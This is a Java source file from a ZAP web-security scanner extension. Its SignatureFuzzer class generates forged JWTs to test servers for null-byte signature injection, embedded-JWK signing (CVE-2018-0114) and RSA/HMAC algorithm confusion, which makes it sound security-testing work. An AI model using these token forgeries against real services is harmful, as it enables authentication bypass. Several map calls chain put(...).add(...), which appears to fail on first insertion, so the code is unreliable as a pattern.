/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2019 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.jwt.attacks.fuzzer;

import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.HMAC_256;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JSON_WEB_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_ALGORITHM_KEY_HEADER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_EXP_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_HEADER_WITH_ALGO_PLACEHOLDER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_RSA_ALGORITHM_IDENTIFIER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.JWT_TOKEN_PERIOD_CHARACTER;
import static org.zaproxy.zap.extension.jwt.utils.JWTConstants.NULL_BYTE_CHARACTER;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.JWSSigner;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.JWKSet;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.RSAKeyGenerator;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Objects;
import org.apache.log4j.Logger;
import org.json.JSONException;
import org.json.JSONObject;
import org.parosproxy.paros.Constant;
import org.zaproxy.zap.extension.jwt.JWTConfiguration;
import org.zaproxy.zap.extension.jwt.JWTTokenBean;
import org.zaproxy.zap.extension.jwt.utils.JWTUtils;
import org.zaproxy.zap.extension.jwt.utils.VulnerabilityType;

/** @author preetkaran20@gmail.com KSASAN */
public class SignatureFuzzer implements JWTFuzzer {

    private static final Logger LOGGER = Logger.getLogger(SignatureFuzzer.class);

    private static final String MESSAGE_PREFIX =
            "jwt.scanner.server.vulnerability.signatureFuzzer.";

    /**
     * Adds Null Byte to the signature to check if JWT is vulnerable to Null Byte injection
     *
     * @param jwtTokenBean
     * @return Null Byte fuzzed token
     * @throws UnsupportedEncodingException
     */
    private void addNullByteFuzzedTokens(
            JWTTokenBean jwtTokenBean,
            LinkedHashMap<VulnerabilityType, List<String>> vulnerabilityTypeAndFuzzedTokens)
            throws UnsupportedEncodingException {
        // Appends signature with NullByte plus ZAP eyeCather.
        JWTTokenBean cloneJWTTokenBean = new JWTTokenBean(jwtTokenBean);
        byte[] nullByteAddedPayload =
                JWTUtils.getBytes(NULL_BYTE_CHARACTER + Constant.getEyeCatcher());
        byte[] newSignature =
                new byte[jwtTokenBean.getSignature().length + nullByteAddedPayload.length];
        System.arraycopy(
                jwtTokenBean.getSignature(),
                0,
                newSignature,
                0,
                jwtTokenBean.getSignature().length);
        System.arraycopy(
                nullByteAddedPayload,
                0,
                newSignature,
                jwtTokenBean.getSignature().length,
                nullByteAddedPayload.length);
        cloneJWTTokenBean.setSignature(newSignature);
        vulnerabilityTypeAndFuzzedTokens
                .put(VulnerabilityType.NULL_BYTE, new ArrayList<String>())
                .add(cloneJWTTokenBean.getToken());

        // Replaces the signature with NullByte.
        cloneJWTTokenBean.setSignature(JWTUtils.getBytes(NULL_BYTE_CHARACTER));
        vulnerabilityTypeAndFuzzedTokens
                .put(VulnerabilityType.NULL_BYTE, new ArrayList<String>())
                .add(cloneJWTTokenBean.getToken());
    }

    /**
     * Payload is as per the https://nvd.nist.gov/vuln/detail/CVE-2018-0114 vulnerability
     *
     * @param jwtTokenBean
     * @param vulnerabilityTypeAndFuzzedTokens
     * @throws NoSuchAlgorithmException
     * @throws JOSEException
     * @throws ParseException
     */
    public void populateTokenSignedWithCustomPrivateKey(
            JWTTokenBean jwtTokenBean,
            LinkedHashMap<VulnerabilityType, List<String>> vulnerabilityTypeAndFuzzedTokens)
            throws NoSuchAlgorithmException, JOSEException, ParseException {
        JSONObject headerJSONObject = new JSONObject(jwtTokenBean.getHeader());
        JSONObject payloadJSONObject = new JSONObject(jwtTokenBean.getPayload());
        String algoType = headerJSONObject.getString(JWT_ALGORITHM_KEY_HEADER);
        if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
            long expiryTimeInMillis = payloadJSONObject.getLong(JWT_EXP_ALGORITHM_IDENTIFIER);
            expiryTimeInMillis = expiryTimeInMillis + 2000;
            payloadJSONObject.put(JWT_EXP_ALGORITHM_IDENTIFIER, expiryTimeInMillis);

            // Generating JWK
            RSAKeyGenerator rsaKeyGenerator = new RSAKeyGenerator(2048);
            rsaKeyGenerator.algorithm(JWSAlgorithm.parse(algoType));
            RSAKey rsaKey = rsaKeyGenerator.generate();
            headerJSONObject.put(JSON_WEB_KEY_HEADER, rsaKey.toJSONObject());

            // Getting base64 encoded signed token
            JWSSigner signer = new RSASSASigner(rsaKey);
            SignedJWT signedJWT =
                    new SignedJWT(
                            JWSHeader.parse(headerJSONObject.toString()),
                            JWTClaimsSet.parse(payloadJSONObject.toString()));
            signedJWT.sign(signer);
            vulnerabilityTypeAndFuzzedTokens
                    .computeIfAbsent(
                            VulnerabilityType.JWK_CUSTOM_KEY,
                            (vulnerabilityType) -> new ArrayList<String>())
                    .add(signedJWT.serialize());
        }
    }

    /**
     * Returns Fuzzed token by confusing algo keys.
     *
     * <p>Background about the attack:<br>
     * Say an application is using RSA to sign JWT now what will be the verification method {@code
     * verify(String jwtToken, byte[] key); }
     *
     * <p>Now if application is using RSA then for verification RSA public key will be used and in
     * case jwttoken is based on HMAC algorithm then verify method will think key as Secret key for
     * HMAC and will try to decrypt it and as public key is known to everyone so anyone can sign the
     * key with public key and HMAC will accept it.
     *
     * @param jwtTokenBean
     * @param vulnerabilityTypeAndFuzzedTokens
     */
    private void getAlgoKeyConfusionFuzzedToken(
            JWTTokenBean jwtTokenBean,
            LinkedHashMap<VulnerabilityType, List<String>> vulnerabilityTypeAndFuzzedTokens) {
        try {
            KeyStore keyStore = KeyStore.getInstance("JKS");
            String trustStorePath = JWTConfiguration.getInstance().getTrustStorePath();
            if (trustStorePath == null) {
                trustStorePath = System.getProperty("javax.net.ssl.trustStore");
            }
            if (Objects.nonNull(trustStorePath)) {
                char[] password = JWTConfiguration.getInstance().getTrustStorePassword();
                keyStore.load(new FileInputStream(trustStorePath), password);

                JWKSet jwkSet = JWKSet.load(keyStore, null);
                List<JWK> trustedKeys = jwkSet.getKeys();
                JSONObject jwtHeaderJSON = new JSONObject(jwtTokenBean.getHeader());
                String algoType = jwtHeaderJSON.getString(JWT_ALGORITHM_KEY_HEADER);
                if (algoType.startsWith(JWT_RSA_ALGORITHM_IDENTIFIER)) {
                    String jwtFuzzedHeader =
                            String.format(JWT_HEADER_WITH_ALGO_PLACEHOLDER, HMAC_256);
                    String base64EncodedFuzzedHeaderAndPayload =
                            JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(jwtFuzzedHeader)
                                    + JWT_TOKEN_PERIOD_CHARACTER
                                    + JWTUtils.getBase64UrlSafeWithoutPaddingEncodedString(
                                            jwtTokenBean.getPayload());
                    for (JWK jwk : trustedKeys) {
                        try {
                            if (jwk instanceof RSAKey) {
                                MACSigner macSigner =
                                        new MACSigner(((RSAKey) jwk).toPublicKey().getEncoded());
                                Base64URL signedToken =
                                        macSigner.sign(
                                                JWSHeader.parse(jwtFuzzedHeader),
                                                JWTUtils.getBytes(
                                                        base64EncodedFuzzedHeaderAndPayload));
                                jwtTokenBean.setSignature(signedToken.decode());
                                vulnerabilityTypeAndFuzzedTokens
                                        .put(
                                                VulnerabilityType.ALGORITHM_CONFUSION,
                                                new ArrayList<String>())
                                        .add(jwtTokenBean.getToken());
                            }
                        } catch (JOSEException | ParseException e) {
                            LOGGER.error(
                                    "Exception occurred while creating fuzzed token for confusion scenario",
                                    e);
                        }
                    }
                }
            }
        } catch (KeyStoreException
                | NoSuchAlgorithmException
                | CertificateException
                | IOException e) {
            LOGGER.error("Exception occurred while getting fuzzed token for confusion scenario", e);
        }
    }

    @Override
    public LinkedHashMap<VulnerabilityType, List<String>> fuzzedTokens(JWTTokenBean jwtTokenBean) {
        LinkedHashMap<VulnerabilityType, List<String>> vulnerabilityTypeAndFuzzedTokens =
                new LinkedHashMap<VulnerabilityType, List<String>>();
        try {
            this.populateTokenSignedWithCustomPrivateKey(
                    jwtTokenBean, vulnerabilityTypeAndFuzzedTokens);
            this.getAlgoKeyConfusionFuzzedToken(jwtTokenBean, vulnerabilityTypeAndFuzzedTokens);
            this.addNullByteFuzzedTokens(jwtTokenBean, vulnerabilityTypeAndFuzzedTokens);
        } catch (NoSuchAlgorithmException
                | JSONException
                | IOException
                | JOSEException
                | ParseException e) {
            LOGGER.error("error occurred while getting signed fuzzed tokens", e);
        }
        return vulnerabilityTypeAndFuzzedTokens;
    }

    @Override
    public String getFuzzerMessagePrefix() {
        return MESSAGE_PREFIX;
    }
}
